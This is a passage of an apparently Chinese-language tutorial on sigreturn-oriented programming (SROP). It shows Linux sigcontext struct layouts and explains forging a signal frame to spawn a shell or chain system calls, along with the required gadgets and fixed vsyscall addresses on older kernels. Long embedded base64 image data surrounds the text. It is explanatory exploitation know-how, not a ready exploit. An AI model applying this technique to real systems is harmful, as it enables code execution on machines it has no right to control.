orYFGjkWkaTAMOqY7uOqsROZMSObmlIh93hDbPQ1XdZrQxk73iMdFhT6+iXx9f5D52xtxNo7dZFjk+RUFWFl+kvYsi/Jg7GMMM3okOhA4eY2uYRJVSuLxRk+E3HOodV1TfvvttznjjDO4//77KS+v+TqFz+fDMIxW/1Nn7h78cOZbfL2/kFXznue3P76UszNTqpQ0mUnZjJ8+h/sGxniNfRuoadni2FKZ8Kf3eewHvcJzC0wSe0/kyQ/mcEmsuq7t7/Lexoa8ViXNjcKxiMSFr8jHM6t9rK68OgWAUfWyVkMuWOFIcXBJasQGr5/7v/SxwWsR8geZu7yMvzbmZ6PNZHTEUmyEAsxa5mNDrOnxwRAb8j3cM7+EB/fGfjnTaURNKNye72PFScK23WlG1XsX7QuQH56AFKwI8Nf81jdVv6KighkzZtC3b1/efPPNeHenBevA2Vf8jAdfXciqHcUEyg9SkL+J3LXr+DZ/H2WlW1lw31jaxHhmwd8/Ib/Od+cBnOfwy/fzOLx3K99u3c2RLe9y++BYl6ICLHvyRdYoG7dqKqsQkbgI+ILMW+3lpdXQNtXGmW1tdHKDLWiRt9fP1xFlFSTa6OOKXvpt+ZJipuVZUSOkUZdBj3i44nVP1I0who9J4fkeJthMrjrbwWuL/Rxr5tDOCq7eGetuAI3BoEeOm4kbyngv/CFcUljB1W95GdzFRu9EAzNkcagkRO6BYHhdV4NLqnm1xFQ7OYaflcd+GUVebn3bG/UlY8CwFF7rdyKQJ6TY6Wv3nripQqmXqR+HGJcOhYV+vqpPAGkhCgoKuPbaa3n22Wd5+umnGTJkSLy71LIlpNM1Kz1m7W8Uz2Jmzl5Vx1rgMvL2JZHd8btHro7Z9O1Yw+G5j3LnK1ubwd0opTFp5FhE4u5IUZAl2328+62Pt7ZUCsbAsEEu+kcN8lj4/RZ+CwIRP5WFovZbnLhRlkFGZgKP9zerrRHu3dVs1NED02Xn7gvdDI08r2CINbv8vLfJxztb/Hy2N1irGx7YEh38NCfGmUScf2nl13HZuLZX9HNKDvl5f7Ofr8qgY3ozKx5uBEuXLmXYsGFMmTKFffv2xbs7rVwer/zoR7yUV9fYms8rP57GgsO1OPTQAm6d9CArNBOv1VM4FpG4cLhMzmtfeX3hygeZjB+ezJN9G+Fub6bJiKEpvDPKxei2xvFl21JS7Ew6L5lnKrVpMxv6DdMgqb2b53+QxO1ZtpiXkI9xJNq4eKCbG9KrOcAwGTE8hReHOrkg3SS1+nttRDAZOiSJaZ2qhuBOPRJ45Ax9PACEQiFeeeUV+vTpw6xZs/D5NKZYb+WbeOvp1/hkdSG1vzDhZ8dnzzDlnHO55Z1d9Zok59v2Mv95/vW8sKr6+5fv/uxRfnjuJOZ8W+eCZmmBDBpvbXURaUHGjx/PggULjj9eP7ULlq8ByhCCIfIPBckvszjsCVHs/64etluajSEZtloGvYZmsWdTKZcsOzHc2mdoCn8909Zoo8lBf5DcfUE2F4coCoDdbpCWZJLTzk7flKrrMDcYy6Jgv5/lB0OUGAZZHRyMbG/WfY3nZqDLDY+TfuEUABYvXszYsWPr/Bo5OTk8/PDDTJo0qaG717q40ulz9nCGDDqD7KxMunVqR5ukJNwO8Jcf5eCenWxZv4J//eMz1uz2VJ2XUEUKo1/eyuIpHSptX889fYfw+GYfmCmccfE1TL50OP26pmHzHqFwyyr+Ne9dPvpmv0op5DjVHItIfNlMenYw6Xm62w2F+GK9j4ruTr7f1owKnyFvkDdzI+sQDHLaNm6Zhc1hY1A3G4MasY2YDINuHZ1MqqkOU47bsmWLgnFD8B5i8/KP2Lz8o9PXZqiEbz9+kRkfv3j62pRmSeFYRFopi/xtHh5f5SGljY3B6TY6uQBfiHUFATZFDiO57ExQDa6ISKugcCwirV5JcZAlxdXNfDMYc66bc12ntUsiIhInCsciUi/OjCwsXzNeDDTkp1fWdjqsK2d/NbnYTE7ihjHduLOfu+aJg9IsODOy4t0FEWkGFI5FpF76PPhlvLtwyvoCtwaOkrdiOWvyd7N33wGKfA7adOjOGeeMYuTAzri1aIOISKuicCwirZs9jewRl5I9It4dERGRpkBjIiIiIiIiYVrnWERqJTU1ld69e8e7GyINorS0lE2bNsW7G9JgTBI79iSznTP6rpehCvbmb+eIFjGWOlA4FhEREREJU1mFiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhI2P8HCKTXCfFRUFoAAAAASUVORK5CYII=)\n\n对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext\n\nx86\n\n```c\nstruct sigcontext\n{\n  unsigned short gs, __gsh;\n  unsigned short fs, __fsh;\n  unsigned short es, __esh;\n  unsigned short ds, __dsh;\n  unsigned long edi;\n  unsigned long esi;\n  unsigned long ebp;\n  unsigned long esp;\n  unsigned long ebx;\n  unsigned long edx;\n  unsigned long ecx;\n  unsigned long eax;\n  unsigned long trapno;\n  unsigned long err;\n  unsigned long eip;\n  unsigned short cs, __csh;\n  unsigned long eflags;\n  unsigned long esp_at_signal;\n  unsigned short ss, __ssh;\n  struct _fpstate * fpstate;\n  unsigned long oldmask;\n  unsigned long cr2;\n};\n```\n\nx64\n\n```c\nstruct _fpstate\n{\n  /* FPU environment matching the 64-bit FXSAVE layout.  */\n  __uint16_t        cwd;\n  __uint16_t        swd;\n  __uint16_t        ftw;\n  __uint16_t        fop;\n  __uint64_t        rip;\n  __uint64_t        rdp;\n  __uint32_t        mxcsr;\n  __uint32_t        mxcr_mask;\n  struct _fpxreg    _st[8];\n  struct _xmmreg    _xmm[16];\n  __uint32_t        padding[24];\n};\n\nstruct sigcontext\n{\n  __uint64_t r8;\n  __uint64_t r9;\n  __uint64_t r10;\n  __uint64_t r11;\n  __uint64_t r12;\n  __uint64_t r13;\n  __uint64_t r14;\n  __uint64_t r15;\n  __uint64_t rdi;\n  __uint64_t rsi;\n  __uint64_t rbp;\n  __uint64_t rbx;\n  __uint64_t rdx;\n  __uint64_t rax;\n  __uint64_t rcx;\n  __uint64_t rsp;\n  __uint64_t rip;\n  __uint64_t eflags;\n  unsigned short cs;\n  unsigned short gs;\n  unsigned short fs;\n  unsigned short __pad0;\n  __uint64_t err;\n  __uint64_t trapno;\n  __uint64_t oldmask;\n  __uint64_t cr2;\n  __extension__ union\n    {\n      struct _fpstate * fpstate;\n      __uint64_t __fpstate_word;\n    };\n  __uint64_t __reserved1 [8];\n};\n```\n\nsignal     handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。\n\n**攻击原理**\n\n仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：\n\n- Signal  Frame被保存在用户的地址空间中，所以用户是可以读写的。\n- 由于内核与信号处理程序无关(kernel     agnostic about signal handlers)，它并不会去记录这个signal对应的Signal     Frame，所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。\n\n说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。\n\n**获取shell**\n\n首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息\n\n当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。\n\n**system call chains**\n\n需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可\n\n- **控制栈指针。**\n- **把原来rip指向的syscall     gadget换成syscall; ret gadget。**\n\n如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。\n\n**后续**\n\n需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件\n\n- **可以通过栈溢出来控制栈的内容**\n\n- **需要知道相应的地址**\n\n- - **\"/bin/sh\"**\n  - **Signal      Frame**\n  - **syscal**\n  - **sigreturn**\n\n- 需要有够大的空间来塞下整个sigal     frame\n\n此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：\n\n\n\n并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说Linux < 3.3 x86_64（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&return代码片段。如下\n\n![gadget1](data:image/png;base64,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WpeKwhrpFxERERHZA28pS9fJZfz5yj2Y8BMHFEREREQ3Ow4qyMbycObfLzFtQDsMmrsPmbxTKhEREdFNj6c/UTWo4OQVgID6jnC49pAICvOu4ELqWaRbM88FEREREd1wOKggIiIiIiKr8PQnIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4aCCiIiIiIiswkEFERERERFZhYMKIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrKKxt4dICIi2+gIQGfvTtzijgM4b+9OEBHZAQcVREQ3gT8A3G7vThAKADwAYIO9O0JEVMN4+hMR0Q2uDTigqC00AB6zdyeIiOyAgwoiohuck707QOU427sDRER2wNOfiIhuMn0BnLR3J24xiwHcY+9OEBHZEQcVREQ3mbPFQTWH65uIbnU8/YmIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4eR3RERERFTj1O4t0LmtNzRXk3HwwClkFdm7R2SNWjCoUEHXvB9GDQ9DSy8dtKocHP58LlYfySmfpWuOfqOGI6ylF3RaFXIOf46Zq48wx4IcjXsgOgY3g1vBeRw7cBjJ2RU+vSpn+HUIRWuPPCRGRyI+owBGaluOzamh0aqhQhEK9AUov4ac4N0uFO0bOyLrRDT2x1+C7XukgkarMX0IsagQBQWFsP13rgrOfh0Q2toDeYnRiIzPqP5yadwR2DEYzdwKcP7YARxOzq7QX1vVUtJOTdYCVM5+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